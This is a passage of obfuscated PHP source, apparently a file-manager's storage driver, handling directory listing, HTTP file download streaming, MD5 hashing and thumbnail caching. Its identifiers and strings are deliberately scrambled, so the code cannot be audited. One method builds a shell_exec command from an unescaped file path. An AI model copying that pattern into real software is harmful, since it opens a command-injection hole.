$ŠƒÅá—Î[$‹Á—ã¸¥]; } $Ãùóå¿¡ = $this->info($‹Á—ã¸¥); if ($Ãùóå¿¡ && $Ãùóå¿¡[$ÆşËò˜û[33]] == $ÆşËò˜û[78]) { $©±¼ €ä = array($ÆşËò˜û[79] => 0, $ÆşËò˜û[80] => 0, $ÆşËò˜û[81] => 0); $this->infoChildren($‹Á—ã¸¥, $©±¼ €ä); $Ãùóå¿¡[$ÆşËò˜û[79]] = $©±¼ €ä[$ÆşËò˜û[79]]; $Ãùóå¿¡[$ÆşËò˜û[82]] = array($ÆşËò˜û[83] => $©±¼ €ä[$ÆşËò˜û[80]], $ÆşËò˜û[84] => $©±¼ €ä[$ÆşËò˜û[81]]); $ŠƒÅá—Î[$‹Á—ã¸¥] = $Ãùóå¿¡; } return $Ãùóå¿¡; } public function listPath($ïù¢š, $÷¨÷Ó• = false) { } public function has($‹çÇ¹É”, $¡‘ääƒ = false, $ù´ƒĞÇ = false) { } public function canRead($³Áö³Ï˜) { } public function canWrite($•ßØœÆ¨) { } public function getContent($šóÁÙšõ) { } public function setContent($šëâä•ª, $ìçëÒ–³ = '') { } protected function infoChildren($·è…¦’Í, &$àú†„„Ê) { $³šŠ æ =& $_SERVER[´‹ô¯Œ]; check_abort_echo(); $‚Á†ã£¹ = $this->listPath($·è…¦’Í, !0); $‚Á†ã£¹ = array_merge($‚Á†ã£¹[$³šŠ æ[85]], $‚Á†ã£¹[$³šŠ æ[86]]); foreach ($‚Á†ã£¹ as $áË¡•¨Ã) { if ($áË¡•¨Ã[$³šŠ æ[33]] == $³šŠ æ[78]) { $àú†„„Ê[$³šŠ æ[81]]++; $™Ì½Úœê = $this->getPathInner($áË¡•¨Ã[$³šŠ æ[87]]); $this->infoChildren($™Ì½Úœê, $àú†„„Ê); } else { $àú†„„Ê[$³šŠ æ[80]]++; $àú†„„Ê[$³šŠ æ[79]] += $áË¡•¨Ã[$³šŠ æ[79]]; } } } public function fileSubstr($ şÆ»ª, $´•æöÇÓ, $•Şš«­Õ) { } public function listAll($Ëš²ÙêÜ) { } public function listAllMake($†ä‡Ö®™, &$İê˜ÓÛ) { $Àş Ïö =& $_SERVER[´‹ô¯Œ]; check_abort_echo(); $Û³ÃÜÅ• = $this->listPath($†ä‡Ö®™, !0); if (!$Û³ÃÜÅ•) { return; } $øôÀí´ù = array_merge($Û³ÃÜÅ•[$Àş Ïö[85]], $Û³ÃÜÅ•[$Àş Ïö[86]]); foreach ($øôÀí´ù as $¢äí†ô¬) { $Â‡’¹ğÄ = $¢äí†ô¬[$Àş Ïö[33]] == $Àş Ïö[78]; $‡£†ª¸í = array($Àş Ïö[87] => $¢äí†ô¬[$Àş Ïö[87]], $Àş Ïö[78] => $Â‡’¹ğÄ); if (isset($¢äí†ô¬[$Àş Ïö[79]])) { $‡£†ª¸í[$Àş Ïö[79]] = $¢äí†ô¬[$Àş Ïö[79]]; } if (isset($¢äí†ô¬[$Àş Ïö[88]])) { $‡£†ª¸í[$Àş Ïö[88]] = $¢äí†ô¬[$Àş Ïö[88]]; } if (!$Â‡’¹ğÄ) { $İê˜ÓÛ[] = $‡£†ª¸í; continue; } $İê˜ÓÛ[] = $‡£†ª¸í; $üÉÔê¬ï = $¢äí†ô¬[$Àş Ïö[87]]; $¿Êø§ = $this->pathDriver; if (substr($¢äí†ô¬[$Àş Ïö[87]], 0, strlen($¿Êø§)) == $¿Êø§) { $üÉÔê¬ï = substr($üÉÔê¬ï, strlen($¿Êø§)); } $this->listAllMake($üÉÔê¬ï, $İê˜ÓÛ); } } public function listAllSimple($İô±äø‘, $å×ñ—¥ô = false) { $éÉğ°ş˜ = $this->listAll($İô±äø‘); return $this->listAllSimpleMake($éÉğ°ş˜, $this->getPathOuter($İô±äø‘), $å×ñ—¥ô); } public function listAllSimpleMake($ÅÕ¤¸¶, $¶ıØŒ½ù, $×’ñÖ‚ş) { $Å«êÏ¡Õ =& $_SERVER[´‹ô¯Œ]; $Õ•àáö = array(); $¶ıØŒ½ù = rtrim(get_path_father($¶ıØŒ½ù), $Å«êÏ¡Õ[8]) . $Å«êÏ¡Õ[8]; foreach ($ÅÕ¤¸¶ as $Í˜‘Å õ) { $­å…î„ = array($Å«êÏ¡Õ[87] => $Í˜‘Å õ[$Å«êÏ¡Õ[87]], $Å«êÏ¡Õ[89] => $Í˜‘Å õ[$Å«êÏ¡Õ[87]], $Å«êÏ¡Õ[78] => $Í˜‘Å õ[$Å«êÏ¡Õ[78]]); if (isset($Í˜‘Å õ[$Å«êÏ¡Õ[79]]) && !$Í˜‘Å õ[$Å«êÏ¡Õ[78]]) { $­å…î„[$Å«êÏ¡Õ[79]] = $Í˜‘Å õ[$Å«êÏ¡Õ[79]]; } if (isset($Í˜‘Å õ[$Å«êÏ¡Õ[88]])) { $­å…î„[$Å«êÏ¡Õ[88]] = $Í˜‘Å õ[$Å«êÏ¡Õ[88]]; } if (is_array($Í˜‘Å õ[$Å«êÏ¡Õ[90]])) { $­å…î„[$Å«êÏ¡Õ[89]] = $Í˜‘Å õ[$Å«êÏ¡Õ[90]][$Å«êÏ¡Õ[87]]; $­å…î„[$Å«êÏ¡Õ[79]] = $Í˜‘Å õ[$Å«êÏ¡Õ[90]][$Å«êÏ¡Õ[79]]; $­å…î„[$Å«êÏ¡Õ[88]] = $Í˜‘Å õ[$Å«êÏ¡Õ[90]][$Å«êÏ¡Õ[88]]; } else { if (substr($Í˜‘Å õ[$Å«êÏ¡Õ[87]], 0, strlen($¶ıØŒ½ù)) == $¶ıØŒ½ù) { $­å…î„[$Å«êÏ¡Õ[87]] = substr($Í˜‘Å õ[$Å«êÏ¡Õ[87]], strlen($¶ıØŒ½ù)); } } $Æ·ß•÷è = $Í˜‘Å õ[$Å«êÏ¡Õ[78]] ? $Å«êÏ¡Õ[8] : $Å«êÏ¡Õ[12]; $­å…î„[$Å«êÏ¡Õ[89]] = rtrim($­å…î„[$Å«êÏ¡Õ[89]], $Å«êÏ¡Õ[8]) . $Æ·ß•÷è; $­å…î„[$Å«êÏ¡Õ[87]] = $Å«êÏ¡Õ[8] . trim($­å…î„[$Å«êÏ¡Õ[87]], $Å«êÏ¡Õ[8]) . $Æ·ß•÷è; if (!$×’ñÖ‚ş) { $ê¤îºÎ¼ = explode($Å«êÏ¡Õ[8], trim($­å…î„[$Å«êÏ¡Õ[87]], $Å«êÏ¡Õ[8])); $­å…î„[$Å«êÏ¡Õ[87]] = $Å«êÏ¡Õ[8] . implode($Å«êÏ¡Õ[8], array_slice($ê¤îºÎ¼, 1)) . $Æ·ß•÷è; } $Õ•àáö[] = $­å…î„; } return array_sort_by($Õ•àáö, $Å«êÏ¡Õ[87]); } public function upload($“®ş“±, $š¿¹—¢±, $ÀŸĞÇàº = false, $šé˜ŸˆÆ = REPEAT_REPLACE) { } public function uploadFileByID($Ó´’Á™, $¦Ô«ß»Ô, $Ó¢ãÙĞ) { } public function uploadFileByPath($€ê•Å², $ĞÂä‰Òâ, $øÄ½¯í = array()) { } public function isUploadServer() { $®ïˆ—– =& $_SERVER[´‹ô¯Œ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $®ïˆ—–[91]) { return !0; } return $GLOBALS[$®ïˆ—–[6]][$®ïˆ—–[92]][$®ïˆ—–[93]]; } public function isFileOutServer() { $·ª½ş‹õ =& $_SERVER[´‹ô¯Œ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $·ª½ş‹õ[91]) { return !0; } return $GLOBALS[$·ª½ş‹õ[6]][$·ª½ş‹õ[92]][$·ª½ş‹õ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ø²ôˆª) { $å°ê’× =& $_SERVER[´‹ô¯Œ]; if (!$this->isCdnHost()) { return $Ø²ôˆª; } return str_replace(trim(get_url_root($Ø²ôˆª), $å°ê’×[8]), trim($this->cdnHost, $å°ê’×[8]), $Ø²ôˆª); } public function uploadLink($õÔÄ–Å, $ÔëÈ†‹µ = 0) { $ªµàÒ¥ =& $_SERVER[´‹ô¯Œ]; if ($this->isUploadServer()) { return; } $¼Ë×Ü±Ë = $this->getType(); if (!in_array($¼Ë×Ü±Ë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ŒÌ©æşÁ = 1024 * 1024 * 10; $åõ–ĞßÊ = $ÔëÈ†‹µ <= $ŒÌ©æşÁ ? $ªµàÒ¥[95] : $ªµàÒ¥[96]; $à€Àğ£Ğ = (!$ÔëÈ†‹µ ? 1 : ceil($ÔëÈ†‹µ / pow(1024, 3))) * 3600 * 4; $Â¹¢€ä• = $this->{$åõ–ĞßÊ}($õÔÄ–Å, $à€Àğ£Ğ); if ($Â¹¢€ä•) { $Â¹¢€ä•[$ªµàÒ¥[97]] = $õÔÄ–Å; $Â¹¢€ä•[$ªµàÒ¥[98]] = $¼Ë×Ü±Ë; } return $Â¹¢€ä•; } public function uploadFormData($¨çÓùó, $˜´Õêã = 3600) { } public function uploadMultiData($ô¸°¹­¨, $‘ï¿’Ï = 3600) { } public function multiUploadFormData($ßË„‚ƒª, $Š›¸ú·ª = 3600) { return $this->uploadMultiData($ßË„‚ƒª, $Š›¸ú·ª); } public function download($¼µ÷£§Õ, $õÓÏ¿çô) { } public function ext($ÄŠúğ) { $ğâ•é…ğ =& $_SERVER[´‹ô¯Œ]; if (strpos($ÄŠúğ, $ğâ•é…ğ[8]) === -1) { $„§¼Æß = $ÄŠúğ; } else { $„§¼Æß = $this->pathThis($ÄŠúğ); } $µ‘¬Û®³ = $ğâ•é…ğ[12]; if (strstr($„§¼Æß, $ğâ•é…ğ[10])) { $µ‘¬Û®³ = substr($„§¼Æß, strrpos($„§¼Æß, $ğâ•é…ğ[10]) + 1); $µ‘¬Û®³ = strtolower($µ‘¬Û®³); } if (strlen($µ‘¬Û®³) > 3 && preg_match($ğâ•é…ğ[99], $µ‘¬Û®³, $ñ£”ÚÇ‘)) { $µ‘¬Û®³ = $ğâ•é…ğ[12]; } return $µ‘¬Û®³; } public function pathThis($·©Ë¶Ì) { $€¹ú½º =& $_SERVER[´‹ô¯Œ]; $·©Ë¶Ì = str_replace($€¹ú½º[100], $€¹ú½º[8], rtrim($·©Ë¶Ì, $€¹ú½º[8])); $“×¥ ‡ß = strrpos($·©Ë¶Ì, $€¹ú½º[8]); if ($“×¥ ‡ß === !1) { return $·©Ë¶Ì; } return substr($·©Ë¶Ì, $“×¥ ‡ß + 1); } public function pathFather($çú»éºï) { $£ÙõĞÉæ =& $_SERVER[´‹ô¯Œ]; $çú»éºï = str_replace($£ÙõĞÉæ[100], $£ÙõĞÉæ[8], rtrim($çú»éºï, $£ÙõĞÉæ[8])); $ïÚıÎÒş = strrpos($çú»éºï, $£ÙõĞÉæ[8]); if ($ïÚıÎÒş === !1) { return $£ÙõĞÉæ[12]; } return substr($çú»éºï, 0, $ïÚıÎÒş + 1); } public function hashSimple($ºİ²ê¨ï) { $õ¿Êğ¸Œ =& $_SERVER[´‹ô¯Œ]; if (!$ºİ²ê¨ï) { return md5($õ¿Êğ¸Œ[12]); } $¦¯á»» = $this->size($ºİ²ê¨ï); $¹Ò¯£ê = 200; $Ú³–†¾— = 50; if ($¦¯á»» <= $¹Ò¯£ê * $Ú³–†¾—) { return $this->hashMd5($ºİ²ê¨ï) . $¦¯á»»; } $ÅÃ†·Ò˜ = intval($¦¯á»» / $Ú³–†¾—); $•úƒê = $õ¿Êğ¸Œ[12]; for ($ÈÆÊà€² = 0; $ÈÆÊà€² < $Ú³–†¾—; $ÈÆÊà€²++) { $•úƒê .= $this->fileSubstr($ºİ²ê¨ï, $ÅÃ†·Ò˜ * $ÈÆÊà€², $¹Ò¯£ê); } $•úƒê .= $this->fileSubstr($ºİ²ê¨ï, $¦¯á»» - $¹Ò¯£ê, $¹Ò¯£ê); return md5($•úƒê) . $¦¯á»»; } public static $md5Cache = array(); public function hashMd5($Ï¥€Å€û) { if (!$Ï¥€Å€û) { return md5($_SERVER[´‹ô¯Œ][12]); } $Ï¥€Å€û = $this->iconvSystem($Ï¥€Å€û); if (isset(self::$md5Cache[$Ï¥€Å€û])) { return self::$md5Cache[$Ï¥€Å€û]; } self::$md5Cache[$Ï¥€Å€û] = $this->hashMd5Shell($Ï¥€Å€û); if (!self::$md5Cache[$Ï¥€Å€û]) { self::$md5Cache[$Ï¥€Å€û] = @md5_file($Ï¥€Å€û); } return self::$md5Cache[$Ï¥€Å€û]; } private function hashMd5Shell($û©ú±‚ú) { $–àœõ°Ì =& $_SERVER[´‹ô¯Œ]; if (!$û©ú±‚ú) { return md5($–àœõ°Ì[12]); } if (!function_exists($–àœõ°Ì[101])) { return !1; } $¢¼ŠØ¡  = array($–àœõ°Ì[102], $–àœõ°Ì[103]); $è¢µşø¦ = Cache::get($–àœõ°Ì[104]); if (!$è¢µşø¦) { $Ó Üãâ = BASIC_PATH . $–àœõ°Ì[105]; $è‘şî  = md5_file($Ó Üãâ); $è¢µşø¦ = $–àœõ°Ì[106]; foreach ($¢¼ŠØ¡  as $ó¬µ‰Ø¯) { $¿œİ–¥æ = shell_exec($ó¬µ‰Ø¯ . "\40\42{$Ó Üãâ}\x22"); if ($¿œİ–¥æ && substr(trim($¿œİ–¥æ), 0, 32) == $è‘şî ) { $è¢µşø¦ = $ó¬µ‰Ø¯; break; } } Cache::set($–àœõ°Ì[104], $è¢µşø¦, 3600); } if ($è¢µşø¦ == $–àœõ°Ì[106]) { return !1; } $¿œİ–¥æ = shell_exec($è¢µşø¦ . "\x20\x22{$û©ú±‚ú}\x22"); $¿œİ–¥æ = str_replace($–àœõ°Ì[107], $–àœõ°Ì[12], $¿œİ–¥æ); return substr($¿œİ–¥æ, 0, 32); } public function link($Ú„ÔĞßª) { return $Ú„ÔĞßª; } public function fileOut($ÚÄÃ¼°›, $Ÿíë÷™Ø = false, $²ÑìÊ÷ë = false, $Öáæ®â† = '') { $ÄÃÊñüù =& $_SERVER[´‹ô¯Œ]; $this->cacheMethod(null, null); if (!$ÚÄÃ¼°› || !$this->exist($ÚÄÃ¼°›)) { show_json(LNG($ÄÃÊñüù[108]), !1, $²ÑìÊ÷ë); } $¨ÅŠ§  = $this->getType() == $ÄÃÊñüù[109]; $åï“•÷ = $GLOBALS[$ÄÃÊñüù[6]][$ÄÃÊñüù[92]][$ÄÃÊñüù[110]][$ÄÃÊñüù[111]]; $Ç³œÀ×• = (double) $GLOBALS[$ÄÃÊñüù[6]][$ÄÃÊñüù[92]][$ÄÃÊñüù[110]][$ÄÃÊñüù[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $îë ËÉ = $this->infoFull($ÚÄÃ¼°›); $‹¥ïÍé° = $îë ËÉ[$ÄÃÊñüù[79]]; $ÉèñâĞ‡ = gmdate($ÄÃÊñüù[113], $îë ËÉ[$ÄÃÊñüù[88]]); $öµñÊŠŠ = $²ÑìÊ÷ë ? $²ÑìÊ÷ë : $this->iconvApp($îë ËÉ[$ÄÃÊñüù[32]]); $şÄã Â = 0; $ÙÂ³ÂÔ¬ = $‹¥ïÍé° - 1; $äç÷Áæê = $this->ext($öµñÊŠŠ); if (in_array($äç÷Áæê, array($ÄÃÊñüù[114], $ÄÃÊñüù[115], $ÄÃÊñüù[116], $ÄÃÊñüù[117]))) { $äç÷Áæê = $ÄÃÊñüù[118]; } if (in_array($äç÷Áæê, array($ÄÃÊñüù[119]))) { $äç÷Áæê = $ÄÃÊñüù[120]; } if (!$Öáæ®â†) { $Öáæ®â† = md5($ÉèñâĞ‡ . $‹¥ïÍé°); } $Öáæ®â† = $ÄÃÊñüù[121] . $Öáæ®â† . $ÄÃÊñüù[121]; $ãêèâ›ı = get_file_mime($äç÷Áæê); $Ú¼½Ø× = !0; $Ú¼½Ø× = isset($_GET[$ÄÃÊñüù[122]]) ? !1 : !0; if ($Ÿíë÷™Ø === !1 && !mime_support($ãêèâ›ı)) { $ãêèâ›ı = $ÄÃÊñüù[123]; } header($ÄÃÊñüù[124]); header($ÄÃÊñüù[125] . $ãêèâ›ı); $„ĞÆÉ = rawurlencode($öµñÊŠŠ); $„ĞÆÉ = $ÄÃÊñüù[121] . $„ĞÆÉ . $ÄÃÊñüù[126] . $„ĞÆÉ; if ($Ÿíë÷™Ø) { header($ÄÃÊñüù[127]); header($ÄÃÊñüù[128] . $„ĞÆÉ); } else { if ($Ú¼½Ø×) { header($ÄÃÊñüù[129] . $„ĞÆÉ); } } $Õ³¤…ş = 3600 * 24 * 30; header($ÄÃÊñüù[130]); header($ÄÃÊñüù[131]); header($ÄÃÊñüù[132] . $Õ³¤…ş); header($ÄÃÊñüù[133] . gmdate($ÄÃÊñüù[113], time() + $Õ³¤…ş) . $ÄÃÊñüù[134]); if (isset($_SERVER[$ÄÃÊñüù[135]]) && strtotime($_SERVER[$ÄÃÊñüù[135]]) == $îë ËÉ[$ÄÃÊñüù[88]]) { header($ÄÃÊñüù[136], !0, 304); die; } if (isset($_SERVER[$ÄÃÊñüù[137]]) && $_SERVER[$ÄÃÊñüù[137]] == $Öáæ®â†) { header($ÄÃÊñüù[138] . $Öáæ®â†, !0, 304); die; } header($ÄÃÊñüù[138] . $Öáæ®â†); header($ÄÃÊñüù[139] . $ÉèñâĞ‡ . $ÄÃÊñüù[134]); header($ÄÃÊñüù[140] . $öµñÊŠŠ); header($ÄÃÊñüù[141]); header($ÄÃÊñüù[142] . $‹¥ïÍé°); header($ÄÃÊñüù[143]); Hook::trigger($ÄÃÊñüù[144], $ÚÄÃ¼°›, $‹¥ïÍé°, $öµñÊŠŠ, $äç÷Áæê); if (!$Ÿíë÷™Ø && $äç÷Áæê == $ÄÃÊñüù[145]) { if ($‹¥ïÍé° > 1024 * 1024 * 5) { die; } $´åĞ²Å = $this->getContent($ÚÄÃ¼°›); $´åĞ²Å = Html::clearSVG($´åĞ²Å); header($ÄÃÊñüù[146] . strlen($´åĞ²Å)); echo $´åĞ²Å; die; } $æ‹’Î¾Õ = strtolower($_SERVER[$ÄÃÊñüù[147]]); if ($¨ÅŠ§  && $æ‹’Î¾Õ && $åï“•÷) { if (strstr($æ‹’Î¾Õ, $ÄÃÊñüù[148])) { header($ÄÃÊñüù[149] . $ÚÄÃ¼°›); } else { if (strstr($æ‹’Î¾Õ, $ÄÃÊñüù[150])) { header($ÄÃÊñüù[151] . $ÚÄÃ¼°›); } else { if (strstr($æ‹’Î¾Õ, $ÄÃÊñüù[152])) { header($ÄÃÊñüù[153] . $ÚÄÃ¼°›); } } } if ($Ç³œÀ×•) { header($ÄÃÊñüù[154] . $Ç³œÀ×•); } return; } if (isset($_SERVER[$ÄÃÊñüù[155]])) { if (preg_match($ÄÃÊñüù[156], $_SERVER[$ÄÃÊñüù[155]], $ é–ûò€)) { $şÄã Â = intval($ é–ûò€[1]); $şÄã Â = $şÄã Â <= 0 ? 0 : ($şÄã Â >= $ÙÂ³ÂÔ¬ ? $ÙÂ³ÂÔ¬ : $şÄã Â); if (!empty($ é–ûò€[2])) { $…¡¥ÖÊş = intval($ é–ûò€[2]); $ÙÂ³ÂÔ¬ = $…¡¥ÖÊş < $şÄã Â ? $şÄã Â : ($…¡¥ÖÊş >= $ÙÂ³ÂÔ¬ ? $ÙÂ³ÂÔ¬ : $…¡¥ÖÊş); } } header($ÄÃÊñüù[157]); header("\103\x6f\x6e\164\145\x6e\x74\55\122\x61\156\x67\145\x3a\x20\142\x79\x74\145\163\x20{$şÄã Â}\55{$ÙÂ³ÂÔ¬}\57" . $‹¥ïÍé°); } else { header($ÄÃÊñüù[158]); } header($ÄÃÊñüù[159]); header($ÄÃÊñüù[160]); $Æ«Ú‘ˆ = !0; if ($_SERVER[$ÄÃÊñüù[161]] == $ÄÃÊñüù[162] && $‹¥ïÍé° > 1204 * 1024 * 1024 * 2) { $Æ«Ú‘ˆ = !1; } if ($Æ«Ú‘ˆ) { header($ÄÃÊñüù[163] . ($ÙÂ³ÂÔ¬ - $şÄã Â + 1)); } if ($_SERVER[$ÄÃÊñüù[164]] == $ÄÃÊñüù[165]) { return; } $ù¸ÀƒÏ¡ = array($ÄÃÊñüù[166] => !1, $ÄÃÊñüù[167] => $şÄã Â, $ÄÃÊñüù[168] => $ÙÂ³ÂÔ¬, $ÄÃÊñüù[169] => $äç÷Áæê, $ÄÃÊñüù[170] => $îë ËÉ, $ÄÃÊñüù[171] => $ÄÃÊñüù[12], $ÄÃÊñüù[172] => 0); $ù¸ÀƒÏ¡ = Hook::filter($ÄÃÊñüù[173], $ù¸ÀƒÏ¡); $ş›Ô‹¾ = 1024 * 300; $³ñ– ÉÍ = 0; if ($Ç³œÀ×•) { $³ñ– ÉÍ = intval(1000 * 1000 * ($ş›Ô‹¾ / $Ç³œÀ×•)); } while ($şÄã Â <= $ÙÂ³ÂÔ¬) { $€õ¸Á = timeFloat(); check_abort(); $–ÖÂÜ×ª = $ÙÂ³ÂÔ¬ - $şÄã Â + 1; if ($–ÖÂÜ×ª <= $ş›Ô‹¾) { $ş›Ô‹¾ = $–ÖÂÜ×ª; } $´åĞ²Å = $this->fileSubstr($ÚÄÃ¼°›, $şÄã Â, $ş›Ô‹¾); if ($ù¸ÀƒÏ¡[$ÄÃÊñüù[166]]) { $ù¸ÀƒÏ¡[$ÄÃÊñüù[171]] = $´åĞ²Å; $ù¸ÀƒÏ¡[$ÄÃÊñüù[172]] = $şÄã Â; $ù¸ÀƒÏ¡ = Hook::filter($ÄÃÊñüù[174], $ù¸ÀƒÏ¡); $´åĞ²Å = $ù¸ÀƒÏ¡[$ÄÃÊñüù[171]]; } echo $´åĞ²Å; $şÄã Â += $ş›Ô‹¾; if ($ş›Ô‹¾ == $–ÖÂÜ×ª) { $şÄã Â = $ÙÂ³ÂÔ¬ + 1; } if ($³ñ– ÉÍ) { $¹İ¤ƒ“ = intval(1000 * 1000 * (timeFloat() - $€õ¸Á)); $İÆôÄÄÔ = $³ñ– ÉÍ - $¹İ¤ƒ“; if ($İÆôÄÄÔ > 5) { usleep($İÆôÄÄÔ); } } } } public function fileOutServer($°ã¤—Ø´, $¡Ïİúåª = false, $·´Û—­˜ = false, $»âúÆÔÁ = '') { $this->fileOut($°ã¤—Ø´, $¡Ïİúåª, $·´Û—­˜, $»âúÆÔÁ); } public function fileOutLink($¾Ş–š­À) { header($_SERVER[´‹ô¯Œ][175] . $¾Ş–š­À); die; } public function cacheMethod($çãç¸‰ö, $¼ø—¿, $·ÏõÖ° = null) { $´¯Åû¾ =& $_SERVER[´‹ô¯Œ]; static $³­ğü¹í = array(); $ŸÇÖåùÖ = $¼ø—¿ ? ltrim($this->getPathOuter($¼ø—¿), $´¯Åû¾[8]) : $´¯Åû¾[12]; $„áÉèÀ• = $´¯Åû¾[176] . $çãç¸‰ö . $´¯Åû¾[177] . rtrim($ŸÇÖåùÖ, $´¯Åû¾[8]); if (is_null($çãç¸‰ö)) { $³­ğü¹í = array(); return; } if (is_null($¼ø—¿)) { foreach ($³­ğü¹í as $„áÉèÀ• => $³Éƒİé) { if (!strstr($„áÉèÀ•, $´¯Åû¾[176] . $çãç¸‰ö . $´¯Åû¾[178])) { continue; } unset($³­ğü¹í[$„áÉèÀ•]); } return; } if ($·ÏõÖ° === $´¯Åû¾[179]) { unset($³­ğü¹í[$„áÉèÀ•]); return; } if (!is_null($·ÏõÖ°)) { $³­ğü¹í[$„áÉèÀ•] = $·ÏõÖ°; return; } $²Ù»ËÊÆ = isset($³­ğü¹í[$„áÉèÀ•]) ? $³­ğü¹í[$„áÉèÀ•] : null; if (!is_null($²Ù»ËÊÆ)) { return $²Ù»ËÊÆ; } $²Ù»ËÊÆ = $this->{$çãç¸‰ö}($¼ø—¿); $³­ğü¹í[$„áÉèÀ•] = $²Ù»ËÊÆ; return $²Ù»ËÊÆ; } public function cacheMethodInfoSet($¯ÍğïÁÇ, $é§˜ÎëÃ, $çœ„ôÒµ = false) { $°¬ƒ¼Ëì =& $_SERVER[´‹ô¯Œ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($°¬ƒ¼Ëì[180], $¯ÍğïÁÇ, $é§˜ÎëÃ); $this->cacheMethod($°¬ƒ¼Ëì[181], $¯ÍğïÁÇ, $é§˜ÎëÃ ? !1 : !0); if (is_array($çœ„ôÒµ)) { $this->cacheMethod($°¬ƒ¼Ëì[182], $¯ÍğïÁÇ, $çœ„ôÒµ); } } public function fileOutImage($ …µç², $ÀÆË¯í³ = 250) { $Â‚Êš±Ë =& $_SERVER[´‹ô¯Œ]; set_timeout(); if (substr($ …µç², 0, 4) == $Â‚Êš±Ë[152]) { $this->fileOutLink($ …µç²); } $Ê±ÜÅâ¿ = $this->info($ …µç²); $ª¥ø©í = !1; $‰ãÇåş = isset($GLOBALS[$Â‚Êš±Ë[183]]) ? $GLOBALS[$Â‚Êš±Ë[183]] : array(); if ($‰ãÇåş && $‰ãÇåş[$Â‚Êš±Ë[184]] == $Ê±ÜÅâ¿[$Â‚Êš±Ë[87]]) { $Ê±ÜÅâ¿ = $‰ãÇåş; $¥ğÏşŒÈ = $Ê±ÜÅâ¿[$Â‚Êš±Ë[185]]; if ($¥ğÏşŒÈ && isset($¥ğÏşŒÈ[$Â‚Êš±Ë[186]])) { if ($¥ğÏşŒÈ[$Â‚Êš±Ë[186]] <= $ÀÆË¯í³ && $¥ğÏşŒÈ[$Â‚Êš±Ë[187]] <= $ÀÆË¯í³) { $ª¥ø©í = !0; } } } if ($Ê±ÜÅâ¿[$Â‚Êš±Ë[79]] <= 1024 * 50 || $ª¥ø©í || !function_exists($Â‚Êš±Ë[188]) || $Ê±ÜÅâ¿[$Â‚Êš±Ë[169]] == $Â‚Êš±Ë[189]) { return $this->fileOut($ …µç², !1, $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]]); } $é’¼Äı˜ = kodIO::hashPath($Ê±ÜÅâ¿); $Éî¥ïöİ = "\143\x6f\166\145\x72\x5f{$é’¼Äı˜}\137{$ÀÆË¯í³}\x2e\x70\156\x67"; $—à½õ²´ = IO_PATH_SYSTEM_TEMP . $Â‚Êš±Ë[190]; $”º›Îñ‹ = IO::infoFullSimple($—à½õ²´); $Ë®¸çü = $”º›Îñ‹ && is_array($”º›Îñ‹) ? $”º›Îñ‹[$Â‚Êš±Ë[87]] : $Â‚Êš±Ë[12]; if (!$Ë®¸çü) { $Ë®¸çü = IO::mkdir($—à½õ²´); } if ($Ê±ÜÅâ¿[$Â‚Êš±Ë[191]] == $Â‚Êš±Ë[192] && isset($Ê±ÜÅâ¿[$Â‚Êš±Ë[193]]) && $Ê±ÜÅâ¿[$Â‚Êš±Ë[193]] == kodIO::sourceID($Ë®¸çü)) { $áš£Ä½ = $Ê±ÜÅâ¿[$Â‚Êš±Ë[194]]; if ($ÀÆË¯í³ <= 500) { $ñ¡ŸÂ“± = preg_replace($Â‚Êš±Ë[195], $Â‚Êš±Ë[196], $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]]); $áš£Ä½ = IO::fileNameExist($Ë®¸çü, $ñ¡ŸÂ“±); } return IO::fileOut(KodIO::make($áš£Ä½), !1, $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]]); } $êÂ²ÍŒ‚ = IO::fileNameExist($Ë®¸çü, $Éî¥ïöİ); if ($êÂ²ÍŒ‚) { return IO::fileOut(KodIO::make($êÂ²ÍŒ‚), !1, $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]]); } if ($ÀÆË¯í³ > 1000) { $this->makeImageCover($Ë®¸çü, $ …µç², $Éî¥ïöİ, $ÀÆË¯í³); $this->makeImageCover($Ë®¸çü, $ …µç², "\143\157\166\x65\x72\x5f{$é’¼Äı˜}\x5f\62\x35\x30\56\160\x6e\x67", 250); $êÂ²ÍŒ‚ = IO::fileNameExist($Ë®¸çü, $Éî¥ïöİ); if ($êÂ²ÍŒ‚) { return IO::fileOut(KodIO::make($êÂ²ÍŒ‚), !1, $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]]); } die; } if (!kodIO::allowCover($Ê±ÜÅâ¿)) { return $this->fileOut($ …µç², !1, $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]]); } $‰¼å¹Áı = Cache::get($Éî¥ïöİ); if ($‰¼å¹Áı == $Â‚Êš±Ë[197] || $‰¼å¹Áı == $Â‚Êš±Ë[198]) { echo $‰¼å¹Áı; die; } Cache::set($Éî¥ïöİ, $Â‚Êš±Ë[198], 60); $²ñ“Õ‡Ô = array($Ë®¸çü, $Ê±ÜÅâ¿[$Â‚Êš±Ë[87]], $Éî¥ïöİ, $ÀÆË¯í³); $£’ÀØ†ô = $Â‚Êš±Ë[199] . $Ê±ÜÅâ¿[$Â‚Êš±Ë[79]] . $Â‚Êš±Ë[200] . $Éî¥ïöİ . $Â‚Êš±Ë[201] . $Ê±ÜÅâ¿[$Â‚Êš±Ë[32]] . $Â‚Êš±Ë[202] . $Ê±ÜÅâ¿[$Â‚Êš±Ë[87]]; TaskQueue::add($Â‚Êš±Ë[203], $²ñ“Õ‡Ô, $£’ÀØ†ô, $Éî¥ïöİ); } public function makeImageCover($Õ‹ÃÔÈÒ, $Úê¥¬Øê, $ †€‹ÇŠ, $†çä»œ) { $ÈÎéÅù¦ =& $_SERVER[´‹ô¯Œ]; if (IO::fileNameExist($Õ‹ÃÔÈÒ, $ †€‹ÇŠ)) { return $ÈÎéÅù¦[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ÈÖàãæ = $this->getPathOuter($Úê¥¬Øê); $Û§àØû = DATA_THUMB . $ †€‹ÇŠ; del_file($Û§àØû); $½á©ªÄ = IO::copy($ÈÖàãæ, 